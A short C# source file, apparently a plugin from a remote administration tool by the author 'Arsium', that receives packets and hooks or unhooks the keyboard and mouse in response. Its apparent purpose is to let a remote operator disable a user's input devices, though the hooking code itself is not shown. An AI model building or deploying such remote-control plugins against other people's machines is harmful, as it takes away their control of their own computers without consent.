using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.currentPacket.packetType)
            {
                case PacketType.HDW_KB_OFF:
                    HookHardware.Global.HookKeyboard();
                    break;

                case PacketType.HDW_KB_ON:
                    HookHardware.Global.UnhookKeyboard();
                    break;

                case PacketType.HDW_MS_OFF:
                    HookHardware.Global.HookMouse();
                    break;

                case PacketType.HDW_MS_ON:
                    HookHardware.Global.UnhookMouse();
                    break;

            }
            Miscellaneous.CleanMemory();
        }
    }
}
